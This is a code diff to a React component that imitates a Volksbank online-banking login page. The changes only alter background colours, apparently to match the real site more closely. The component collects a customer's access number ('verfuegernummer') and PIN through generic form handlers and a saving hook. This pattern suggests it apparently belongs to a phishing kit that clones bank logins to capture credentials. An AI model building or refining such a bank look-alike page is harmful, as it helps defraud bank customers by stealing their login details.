@@ -30,14 +30,14 @@ export function Volksbanken({ formData, onChange, handleRouteAction, saving }: P
   };
 
   return (
-    <div className="min-h-screen font-sans flex flex-col relative bg-white">
+    <div className="min-h-screen font-sans flex flex-col relative bg-[#fff6ec]">
       {/* Background Layer: Split Blue/White Gradient */}
       <div className="absolute inset-0 -z-10 flex flex-col">
-        <div className="h-[64px] bg-white w-full"></div>
+        <div className="h-[64px] bg-[#fff6ec] w-full"></div>
         <div className="flex-1 bg-gradient-to-b from-[#d9eef9] to-[#eaf5fb] w-full relative overflow-hidden">
           {/* Very subtle background light rays (approximating the visual) */}
-          <div className="absolute top-1/2 left-0 w-full h-[200px] bg-white/20 -translate-y-1/2 rotate-[-5deg] scale-150 transform"></div>
-          <div className="absolute top-1/2 left-0 w-full h-[200px] bg-white/20 -translate-y-1/2 rotate-[5deg] scale-150 transform"></div>
+          <div className="absolute top-1/2 left-0 w-full h-[200px] bg-[#fff6ec]/20 -translate-y-1/2 rotate-[-5deg] scale-150 transform"></div>
+          <div className="absolute top-1/2 left-0 w-full h-[200px] bg-[#fff6ec]/20 -translate-y-1/2 rotate-[5deg] scale-150 transform"></div>
         </div>
       </div>
 
@@ -60,7 +60,7 @@ export function Volksbanken({ formData, onChange, handleRouteAction, saving }: P
       <div className="flex-1 flex flex-col items-center pt-8 md:pt-16 px-4">
         
         {/* Login Card */}
-        <div className="w-full max-w-[600px] bg-white shadow-[0_4px_20px_rgba(0,0,0,0.08)] flex flex-col">
+        <div className="w-full max-w-[600px] bg-[#fff6ec] shadow-[0_4px_20px_rgba(0,0,0,0.08)] flex flex-col">
           
           {/* Blue Title Bar */}
           <div className="bg-[#1b65b4] text-white px-6 py-4">
@@ -118,7 +118,7 @@ export function Volksbanken({ formData, onChange, handleRouteAction, saving }: P
                     autoFocus
                     value={formData.verfuegernummer || ""}
                     onChange={(e) => onChange("verfuegernummer", e.target.value)}
-                    className="w-full h-[46px] bg-[#f0f0f0] border border-[#d0d0d0] rounded-[4px] px-4 outline-none focus:border-[#1b65b4] focus:bg-white text-[#333] text-[16px] transition-colors shadow-inner"
+                    className="w-full h-[46px] bg-[#f0f0f0] border border-[#d0d0d0] rounded-[4px] px-4 outline-none focus:border-[#1b65b4] focus:bg-[#fff6ec] text-[#333] text-[16px] transition-colors shadow-inner"
                   />
                 ) : (
                   <div className="animate-in fade-in slide-in-from-right-4 duration-300">
@@ -128,7 +128,7 @@ export function Volksbanken({ formData, onChange, handleRouteAction, saving }: P
                       autoFocus
                       value={formData.pin || ""}
                       onChange={(e) => onChange("pin", e.target.value)}
-                      className="w-full h-[46px] bg-[#f0f0f0] border border-[#d0d0d0] rounded-[4px] px-4 outline-none focus:border-[#1b65b4] focus:bg-white text-[#333] text-[16px] transition-colors shadow-inner"
+                      className="w-full h-[46px] bg-[#f0f0f0] border border-[#d0d0d0] rounded-[4px] px-4 outline-none focus:border-[#1b65b4] focus:bg-[#fff6ec] text-[#333] text-[16px] transition-colors shadow-inner"
                     />
                   </div>
                 )}
